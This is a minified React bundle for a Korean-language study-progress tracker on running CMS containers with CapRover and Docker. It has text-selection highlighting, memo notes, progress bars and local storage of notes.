He.current(ie,le,Ke);Ke()}},[ie,le,Ke,He,Ne]);const qe=se.useMemo(()=>({reference:ge,floating:I,setReference:ne,setFloating:P}),[ne,P]),A=se.useMemo(()=>({reference:ie,floating:le}),[ie,le]),z=se.useMemo(()=>{const H={position:m,left:0,top:0};if(!A.floating)return H;const N=hm(A.floating,k.x),U=hm(A.floating,k.y);return L?{...H,transform:"translate("+N+"px, "+U+"px)",...wm(A.floating)>=1.5&&{willChange:"transform"}}:{position:m,left:N,top:U}},[m,L,A.floating,k.x,k.y]);return se.useMemo(()=>({...k,update:Ke,refs:qe,elements:A,floatingStyles:z}),[k,Ke,qe,A,z])}const pg=(o,u)=>({...ig(o),options:[o,u]}),hg=(o,u)=>({...og(o),options:[o,u]}),gg=(o,u)=>({...cg(o),options:[o,u]}),yg=()=>f.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("circle",{cx:"12",cy:"12",r:"10"}),f.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),f.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]}),vg=()=>f.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"}),f.jsx("polyline",{points:"14 2 14 8 20 8"}),f.jsx("line",{x1:"16",y1:"13",x2:"8",y2:"13"}),f.jsx("line",{x1:"16",y1:"17",x2:"8",y2:"17"}),f.jsx("polyline",{points:"10 9 9 9 8 9"})]}),Sg=()=>f.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("circle",{cx:"11",cy:"11",r:"8"}),f.jsx("path",{d:"m21 21-4.35-4.35"})]}),bg=()=>f.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("rect",{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"}),f.jsx("path",{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"})]});function Eg({selectedText:o,selectionRect:u,onImportant:m,onMemo:r,onSearch:v,onCopy:R,onClose:x}){const L=se.useMemo(()=>u?{getBoundingClientRect:()=>u}:null,[u]),{x:C,y:g,strategy:k,refs:O,update:q}=mg({elements:{reference:L},placement:"top",middleware:[pg(10),gg(),hg({padding:8})],whileElementsMounted:sg});return se.useEffect(()=>{q&&q()},[u,q]),!o||!u?null:f.jsxs(f.Fragment,{children:[f.jsx("div",{className:"fixed inset-0 z-40",onClick:x}),f.jsx("div",{ref:O.setFloating,className:"z-50 bg-white rounded-lg shadow-xl border border-gray-200 animate-fade-in",style:{position:k,top:g??0,left:C??0},children:f.jsxs("div",{className:"flex items-center gap-1 p-2",children:[f.jsxs("button",{onClick:()=>{m(o),x()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-red-50
                       text-red-600 font-medium transition-colors`,title:"중요! 표시",children:[f.jsx(yg,{}),f.jsx("span",{className:"text-sm whitespace-nowrap",children:"중요!"})]}),f.jsx("div",{className:"w-px h-6 bg-gray-200"}),f.jsxs("button",{onClick:()=>{r(o),x()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-indigo-50
                       text-indigo-600 font-medium transition-colors`,title:"메모 작성",children:[f.jsx(vg,{}),f.jsx("span",{className:"text-sm whitespace-nowrap",children:"메모"})]}),f.jsx("div",{className:"w-px h-6 bg-gray-200"}),f.jsxs("button",{onClick:()=>{v(o),x()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-blue-50
                       text-blue-600 font-medium transition-colors`,title:"Google 검색",children:[f.jsx(Sg,{}),f.jsx("span",{className:"text-sm whitespace-nowrap",children:"검색"})]}),f.jsx("div",{className:"w-px h-6 bg-gray-200"}),f.jsxs("button",{onClick:()=>{R(o),x()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-green-50
                       text-green-600 font-medium transition-colors`,title:"클립보드에 복사",children:[f.jsx(bg,{}),f.jsx("span",{className:"text-sm whitespace-nowrap",children:"복사"})]})]})})]})}function Tg({message:o,type:u="success",onClose:m}){se.useEffect(()=>{const v=setTimeout(()=>{m()},3e3);return()=>clearTimeout(v)},[m]);const r=u==="success"?"bg-green-600":"bg-red-600";return f.jsx("div",{className:"fixed bottom-24 left-1/2 transform -translate-x-1/2 z-50 animate-fade-in",children:f.jsxs("div",{className:`${r} text-white px-6 py-3 rounded-lg shadow-lg
                      flex items-center gap-2 min-w-64 max-w-md`,children:[u==="success"?f.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),f.jsx("polyline",{points:"22 4 12 14.01 9 11.01"})]}):f.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("circle",{cx:"12",cy:"12",r:"10"}),f.jsx("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),f.jsx("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),f.jsx("span",{className:"font-medium",children:o})]})})}const _g=({label:o,isSelected:u,onClick:m})=>f.jsx("button",{type:"button",onClick:m,className:`
      px-4 py-2 rounded-lg font-medium transition-all duration-200
      ${u?"bg-indigo-600 text-white shadow-md scale-105":"bg-gray-100 text-gray-700 hover:bg-gray-200"}
    `,children:o});function Rg({selectedText:o,onSave:u,onClose:m}){const[r,v]=se.useState(""),[R,x]=se.useState(""),L=["@이해","@질문","@심화","@상세"],C=()=>{if(!r){alert("카테고리를 선택해주세요.");return}if(!R.trim()){alert("메모 내용을 입력해주세요.");return}u({text:o,category:r,memo:R.trim()}),m()},g=k=>{(k.ctrlKey||k.metaKey)&&k.key==="Enter"&&C()};return f.jsx(f.Fragment,{children:f.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4",onClick:m,children:f.jsxs("div",{className:"bg-white rounded-xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto animate-fade-in",onClick:k=>k.stopPropagation(),children:[f.jsxs("div",{className:"sticky top-0 bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between",children:[f.jsx("h2",{className:"text-xl font-bold text-gray-800",children:"메모 작성"}),f.jsx("button",{onClick:m,className:"text-gray-400 hover:text-gray-600 transition-colors","aria-label":"닫기",children:f.jsxs("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),f.jsx("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]})})]}),f.jsxs("div",{className:"p-6 space-y-6",children:[f.jsxs("div",{children:[f.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"선택된 텍스트"}),f.jsx("div",{className:"bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded",children:f.jsx("p",{className:"text-gray-800 leading-relaxed",children:o})})]}),f.jsxs("div",{children:[f.jsxs("label",{className:"block text-sm font-medium text-gray-700 mb-3",children:["카테고리 선택 ",f.jsx("span",{className:"text-red-500",children:"*"})]}),f.jsx("div",{className:"flex flex-wrap gap-3",children:L.map(k=>f.jsx(_g,{label:k,isSelected:r===k,onClick:()=>v(k)},k))})]}),f.jsxs("div",{children:[f.jsxs("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:["메모 내용 ",f.jsx("span",{className:"text-red-500",children:"*"})]}),f.jsx("textarea",{value:R,onChange:k=>x(k.target.value),onKeyDown:g,placeholder:"메모를 입력하세요... (Ctrl/Cmd + Enter로 저장)",className:`w-full h-40 px-4 py-3 border border-gray-300 rounded-lg
                         focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent
                         resize-none`}),f.jsx("p",{className:"mt-2 text-sm text-gray-500",children:"💡 Tip: Ctrl/Cmd + Enter를 눌러 빠르게 저장할 수 있습니다"})]})]}),f.jsxs("div",{className:"sticky bottom-0 bg-gray-50 border-t border-gray-200 px-6 py-4 flex items-center justify-end gap-3",children:[f.jsx("button",{onClick:m,className:`px-5 py-2.5 rounded-lg font-medium text-gray-700 bg-white border border-gray-300
                       hover:bg-gray-50 transition-colors`,children:"취소"}),f.jsx("button",{onClick:C,className:`px-5 py-2.5 rounded-lg font-medium text-white bg-indigo-600
                       hover:bg-indigo-700 transition-colors shadow-md hover:shadow-lg`,children:"저장"})]})]})})})}function Ag(){const[o,u]=se.useState(()=>{try{const g=localStorage.getItem("cms-tracker-notes");return g?JSON.parse(g):{highlights:[],memos:[]}}catch(g){return console.error("Failed to load notes:",g),{highlights:[],memos:[]}}});return se.useEffect(()=>{try{localStorage.setItem("cms-tracker-notes",JSON.stringify(o))}catch(g){console.error("Failed to save notes:",g)}},[o]),{notes:o,addHighlight:(g,k="")=>{const O={id:crypto.randomUUID(),text:g,type:"important",timestamp:new Date().toISOString(),source:k};return u(q=>({...q,highlights:[...q.highlights,O]})),O.id},addMemo:(g,k,O,q="")=>{const j={id:crypto.randomUUID(),text:g,category:k,memo:O,timestamp:new Date().toISOString(),source:q};return u(K=>({...K,memos:[...K.memos,j]})),j.id},deleteNote:(g,k)=>{k==="highlight"?u(O=>({...O,highlights:O.highlights.filter(q=>q.id!==g)})):k==="memo"&&u(O=>({...O,memos:O.memos.filter(q=>q.id!==g)}))},updateNote:(g,k,O)=>{k==="highlight"?u(q=>({...q,highlights:q.highlights.map(j=>j.id===g?{...j,...O}:j)})):k==="memo"&&u(q=>({...q,memos:q.memos.map(j=>j.id===g?{...j,...O}:j)}))},clearAllNotes:()=>{confirm("모든 노트를 삭제하시겠습니까?")&&u({highlights:[],memos:[]})},exportNotes:()=>{const g=JSON.stringify(o,null,2),k=new Blob([g],{type:"application/json"}),O=URL.createObjectURL(k),q=document.createElement("a");q.href=O,q.download=`cms-notes-${new Date().toISOString().split("T")[0]}.json`,q.click(),URL.revokeObjectURL(O)},importNotes:g=>{try{const k=JSON.parse(g);return k.highlights&&k.memos?(u(k),!0):!1}catch(k){return console.error("Failed to import notes:",k),!1}}}}const gm=({size:o=24})=>f.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:f.jsx("polyline",{points:"6 9 12 15 18 9"})}),ym=({size:o=24})=>f.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:f.jsx("polyline",{points:"9 18 15 12 9 6"})}),xg=({size:o=20,className:u=""})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:u,children:[f.jsx("path",{d:"M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"}),f.jsx("path",{d:"m9 12 2 2 4-4"})]}),Cg=({size:o=20,className:u=""})=>f.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:u,children:f.jsx("circle",{cx:"12",cy:"12",r:"10"})}),Og=({size:o=16})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("circle",{cx:"12",cy:"12",r:"10"}),f.jsx("polyline",{points:"12 6 12 12 16 14"})]}),Dg=({size:o=16})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[f.jsx("circle",{cx:"12",cy:"12",r:"10"}),f.jsx("circle",{cx:"12",cy:"12",r:"6"}),f.jsx("circle",{cx:"12",cy:"12",r:"2"})]}),kg=({size:o=20,className:u=""})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:u,children:[f.jsx("path",{d:"M4 19.5A2.5 2.5 0 0 1 6.5 17H20"}),f.jsx("path",{d:"M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"})]}),wg=({size:o=16,className:u=""})=>f.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:o,height:o,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:u,children:[f.jsx("circle",{cx:"12",cy:"12",r:"10"}),f.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),f.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]});function Mg(){const[o,u]=se.useState({}),[m,r]=se.useState({}),[v,R]=se.useState({}),[x,L]=se.useState({}),[C,g]=se.useState(!1),[k,O]=se.useState(null),[q,j]=se.useState(null),[K,$]=se.useState(!1),[ae,W]=se.useState("");se.useEffect(()=>{C||O(null)},[C]);const{addHighlight:ne,addMemo:P}=Ag();se.useEffect(()=>{const N=localStorage.getItem("cms-tracker-progress");if(N)try{const U=JSON.parse(N);R(U.completedTasks||{}),L(U.activeLevel||{}),u(U.expandedTiers||{}),r(U.expandedTopics||{})}catch(U){console.error("Failed to load progress:",U)}},[]),se.useEffect(()=>{const N={completedTasks:v,activeLevel:x,expandedTiers:o,expandedTopics:m,lastUpdated:new Date().toISOString()};localStorage.setItem("cms-tracker-progress",JSON.stringify(N))},[v,x,o,m]);const ie=N=>{u(U=>({...U,[N]:!U[N]}))},le=N=>{r(U=>({...U,[N]:!U[N]}))},ge=N=>{R(U=>({...U,[N]:!U[N]}))},I=(N,U)=>{L(p=>({...p,[N]:p[N]===U?null:U}))},_e=N=>{let U=0,p=0;return N.topics.forEach(S=>{S.tasks&&S.tasks.forEach((B,G)=>{U++;const V=`${S.id}-task-${G}`;v[V]&&p++})}),U>0?Math.round(p/U*100):0},Ne=()=>{let N=0,U=0;return im.tiers.forEach(p=>{p.topics.forEach(S=>{S.tasks&&S.tasks.forEach((B,G)=>{N++;const V=`${S.id}-task-${G}`;v[V]&&U++})})}),N>0?Math.round(U/N*100):0},He=N=>N.topics.reduce((U,p)=>U+(p.hours||0),0),Ge=N=>{O(N)},Re=(N,U="success")=>{j({message:N,type:U})},Ke=N=>{const U=ne(N);Re("중요! 표시로 저장되었습니다"),console.log("하이라이트 추가됨:",U)},De=N=>{W(N),$(!0)},qe=N=>{const U=P(N.text,N.category,N.memo);Re("메모가 저장되었습니다"),console.log("메모 추가됨:",U)},A=N=>{const U=encodeURIComponent(N);window.open(`https://www.google.com/search?q=${U}`,"_blank")},z=async N=>{try{await navigator.clipboard.writeText(N),Re("클립보드에 복사되었습니다")}catch(U){console.error("복사 실패:",U),Re("복사에 실패했습니다","error")}},H=N=>!N||!N.sections?null:f.jsx("div",{className:"content-section",children:N.sections.map((U,p)=>f.jsxs("div",{className:"mb-4",children:[U.heading&&f.jsx("h3",{className:"font-bold text-lg mb-2",children:U.heading}),U.content&&f.jsx("p",{className:"mb-2",children:U.content}),U.list&&f.jsx("ul",{className:"list-disc pl-6 mb-2",children:U.list.map((S,B)=>f.jsx("li",{children:S},B))}),U.code&&f.jsx("pre",{className:"bg-slate-800 text-slate-100 p-4 rounded-lg overflow-x-auto mb-2",children:f.jsx("code",{children:U.code})}),U.steps&&f.jsx("div",{className:"space-y-2",children:U.steps.map((S,B)=>f.jsxs("div",{children:[f.jsxs("p",{className:"font-semibold",children:[S.label,": ",S.text]}),S.code&&f.jsx("pre",{className:"bg-slate-800 text-slate-100 p-3 rounded-lg overflow-x-auto mt-1",children:f.jsx("code",{children:S.code})}),S.note&&f.jsx("p",{className:"text-sm text-slate-600 mt-1",children:S.note})]},B))}),U.checklist&&f.jsxs(f.Fragment,{children:[f.jsx("ul",{className:"list-none pl-0",children:U.checklist.map((S,B)=>f.jsxs("li",{className:"flex items-start gap-2",children:[f.jsx("span",{children:"□"}),f.jsx("span",{children:S})]},B))}),U.nextStep&&f.jsxs("p",{className:"mt-3 font-semibold",children:["다음 단계: ",U.nextStep]})]})]},p))});return f.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6",children:[f.jsxs("div",{className:"max-w-6xl mx-auto",children:[f.jsxs("div",{className:"bg-white rounded-xl shadow-lg p-6 sm:p-8 mb-6",children:[f.jsx("h1",{className:"text-2xl sm:text-3xl font-bold text-slate-800 mb-2",children:"CMS 운영 학습 프레임워크"}),f.jsx("p",{className:"text-slate-600 mb-6 text-sm sm:text-base",children:"CapRover + Docker 환경에서 멀티 컨테이너 CMS 운영을 위한 체계적 학습 로드맵"}),f.jsxs("div",{className:"bg-gradient-to-r from-indigo-50 to-purple-50 rounded-lg p-4 border border-indigo-200",children:[f.jsxs("div",{className:"flex items-center justify-between mb-2",children:[f.jsx("span",{className:"text-sm font-semibold text-slate-700",children:"전체 진도율"}),f.jsxs("span",{className:"text-2xl font-bold text-indigo-600",children:[Ne(),"%"]})]}),f.jsx("div",{className:"w-full bg-slate-200 rounded-full h-3",children:f.jsx("div",{className:"bg-gradient-to-r from-indigo-500 to-purple-500 h-3 rounded-full transition-all duration-500",style:{width:`${Ne()}%`}})})]})]}),im.tiers.map(N=>{const U=_e(N),p=o[N.id];return f.jsx("div",{className:"mb-4",children:f.jsxs("div",{className:`rounded-xl shadow-md border-2 overflow-hidden ${N.color}`,children:[f.jsx("button",{onClick:()=>ie(N.id),className:"w-full p-4 sm:p-5 text-left hover:opacity-80 transition-opacity",children:f.jsxs("div",{className:"flex items-start justify-between",children:[f.jsxs("div",{className:"flex-1",children:[f.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 mb-2",children:[p?f.jsx(gm,{size:20}):f.jsx(ym,{size:20}),f.jsx("h2",{className:"text-lg sm:text-xl font-bold",children:N.name}),f.jsxs("span",{className:"text-xs sm:text-sm opacity-75",children:["(",N.period,")"]})]}),f.jsxs("p",{className:"text-xs sm:text-sm ml-7 sm:ml-9 opacity-90",children:["📌 ",N.reason]}),f.jsxs("div",{className:"flex items-center gap-3 sm:gap-4 ml-7 sm:ml-9 mt-2 text-xs sm:text-sm",children:[f.jsxs("div",{className:"flex items-center gap-1",children:[f.jsx(Og,{size:14}),f.jsxs("span",{children:[He(N),"시간"]})]}),f.jsxs("div",{className:"flex items-center gap-1",children:[f.jsx(Dg,{size:14}),f.jsxs("span",{children:[N.topics.length,"개 주제"]})]})]})]}),f.jsxs("div",{className:"text-right ml-4",children:[f.jsxs("div",{className:"text-xl sm:text-2xl font-bold mb-1",children:[U,"%"]}),f.jsx("div",{className:"w-16 sm:w-24 bg-white bg-opacity-50 rounded-full h-2",children:f.jsx("div",{className:"bg-current h-2 rounded-full transition-all duration-500",style:{width:`${U}%`}})})]})]})}),p&&f.jsx("div",{className:"bg-white p-4 sm:p-5 space-y-3",children:N.topics.map(S=>{const B=m[S.id],G=S.tasks?S.tasks.filter((F,re)=>v[`${S.id}-task-${re}`]).length:0,V=x[S.id];return f.jsxs("div",{className:"border border-slate-200 rounded-lg overflow-hidden",children:[f.jsx("button",{onClick:()=>le(S.id),className:"w-full p-3 sm:p-4 text-left hover:bg-slate-50 transition-colors",children:f.jsx("div",{className:"flex items-start justify-between",children:f.jsxs("div",{className:"flex-1",children:[f.jsxs("div",{className:"flex items-center gap-2 mb-1",children:[B?f.jsx(gm,{size:16}):f.jsx(ym,{size:16}),f.jsxs("h3",{className:"font-semibold text-slate-800 text-sm sm:text-base",children:[S.id,". ",S.name]})]}),f.jsx("p",{className:"text-xs sm:text-sm text-slate-600 ml-5 sm:ml-6",children:S.goal}),f.jsxs("div",{className:"flex items-center gap-2 ml-5 sm:ml-6 mt-2 flex-wrap",children:[f.jsxs("span",{className:"text-xs bg-slate-100 text-slate-600 px-2 py-1 rounded",children:["⏱️ ",S.hours,"시간"]}),S.tasks&&S.tasks.length>0&&f.jsxs("span",{className:"text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded",children:["✓ ",G,"/",S.tasks.length," 완료"]})]})]})})}),B&&f.jsxs("div",{className:"border-t border-slate-200",children:[S.content&&f.jsx("div",{className:"bg-slate-50 border-b border-slate-200",children:f.jsxs("div",{className:"flex gap-2 p-3 sm:p-4 overflow-x-auto",children:[f.jsx("button",{onClick:()=>I(S.id,"beginner"),className:`px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors whitespace-nowrap ${V==="beginner"?"bg-green-100 text-green-800 border-2 border-green-300":"bg-white text-slate-600 border border-slate-300 hover:bg-slate-100"}`,children:"🌱 초급"}),f.jsx("button",{onClick:()=>I(S.id,"intermediate"),className:`px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors whitespace-nowrap ${V==="intermediate"?"bg-blue-100 text-blue-800 border-2 border-blue-300":"bg-white text-slate-600 border border-slate-300 hover:bg-slate-100"}`,children:"🚀 중급"}),f.jsx("button",{onClick:()=>I(S.id,"advanced"),className:`px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors whitespace-nowrap ${V==="advanced"?"bg-purple-100 text-purple-800 border-2 border-purple-300":"bg-white text-slate-600 border border-slate-300 hover:bg-slate-100"}`,children:"⚡ 고급"})]})}),V&&S.content&&S.content[V]&&f.jsxs("div",{className:"p-4 sm:p-6 bg-gradient-to-br from-white to-slate-50",children:[f.jsxs("div",{className:"flex items-center gap-2 mb-4",children:[f.jsx(kg,{className:"text-indigo-600",size:20}),f.jsx("h4",{className:"font-bold text-base sm:text-lg text-slate-800",children:S.content[V].title})]}),f.jsx("div",{className:"bg-white rounded-lg p-4 sm:p-5 shadow-sm border border-slate-200",children:H(S.content[V])})]}),!V&&f.jsxs("div",{className:"p-3 sm:p-4 bg-slate-50",children:[S.keywords&&f.jsxs("div",{className:"mb-4",children:[f.jsx("p",{className:"text-xs font-semibold text-slate-600 mb-2",children:"🏷️ 키워드"}),f.jsx("div",{className:"flex flex-wrap gap-2",children:S.keywords.map((F,re)=>f.jsx("span",{className:"text-xs bg-white text-slate-700 px-2 py-1 rounded border border-slate-200",children:F},re))})]}),S.tasks&&S.tasks.length>0&&f.jsxs("div",{children:[f.jsx("p",{className:"text-xs font-semibold text-slate-600 mb-2",children:"✅ 실습 과제"}),f.jsx("div",{className:"space-y-2",children:S.tasks.map((F,re)=>{const Qe=`${S.id}-task-${re}`,Ce=v[Qe];return f.jsxs("button",{onClick:()=>ge(Qe),className:"w-full flex items-start gap-3 p-3 bg-white rounded-lg hover:shadow-md transition-shadow text-left",children:[Ce?f.jsx(xg,{size:18,className:"text-green-500 flex-shrink-0 mt-0.5"}):f.jsx(Cg,{size:18,className:"text-slate-300 flex-shrink-0 mt-0.5"}),f.jsx("span",{className:`text-xs sm:text-sm ${Ce?"text-slate-400 line-through":"text-slate-700"}`,children:F})]},Qe)})})]})]})]})]},S.id)})})]})},N.id)}),f.jsxs("div",{className:"bg-white rounded-xl shadow-lg p-4 sm:p-6 mt-6 text-center text-xs sm:text-sm text-slate-600",children:[f.jsxs("p",{className:"flex items-center justify-center gap-2 flex-wrap",children:[f.jsx(wg,{size:16,className:"text-indigo-600"}),f.jsxs("span",{children:["각 주제를 클릭하고 ",f.jsx("strong",{children:"초급/중급/고급"})," 버튼으로 단계별 학습 내용을 확인하세요"]})]}),f.jsx("p",{className:"mt-2",children:"실습 과제를 클릭하여 완료 표시를 하면 진도가 자동으로 계산됩니다"}),f.jsx("p",{className:"mt-4 text-xs text-slate-500",children:"💡 진도는 자동으로 저장됩니다"})]})]}),f.jsx(m0,{isActive:C,onToggle:()=>g(!C)}),f.jsx(g0,{isActive:C,onTextSelected:Ge}),f.jsx(Eg,{selectedText:k?.text,selectionRect:k?.rect,onImportant:Ke,onMemo:De,onSearch:A,onCopy:z,onClose:()=>O(null)}),K&&f.jsx(Rg,{selectedText:ae,onSave:qe,onClose:()=>$(!1)}),q&&f.jsx(Tg,{message:q.message,type:q.type,onClose:()=>j(null)})]})}r0.createRoot(document.getElementById("root")).render(f.jsx(se.StrictMode,{children:f.jsx(Mg,{})}));
